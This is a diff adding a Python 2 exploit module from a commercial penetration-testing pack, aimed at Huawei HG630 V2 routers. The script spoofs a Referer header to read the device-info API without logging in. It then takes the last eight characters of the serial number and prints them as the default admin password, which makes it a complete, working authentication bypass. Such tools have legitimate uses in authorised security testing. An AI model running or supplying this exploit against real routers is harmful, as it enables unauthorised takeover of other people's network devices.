@@ -1,0 +1,46 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_huawei_3'
+_vendor_ = 'huawei'
+_model_  = ['HG630 V2']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/157195/huaweihg630-bypass.txt'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    target = 'https://%s:%d/'%(host,port) 
+    headers = {'Referer': target+'mainFrame.htm'}
+    url = target+'api/system/deviceinfo'           
+    response = requests.get(url, headers=headers, verify=False)      
+  except Exception, e:
+    print '[-] error : %s'%e
+    return
+  
+  m = re.search('"SerialNumber":"([^"]+)"', response.text)
+  if m is None:
+    print '[+] %s not vulnerable'%host
+    return
+  
+  serial = m.group(1)
+  password = serial[-8:]    
+  print '[+] %s vulnerable'%host
+  print '[+] Default admin password: %s'%password
+      
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
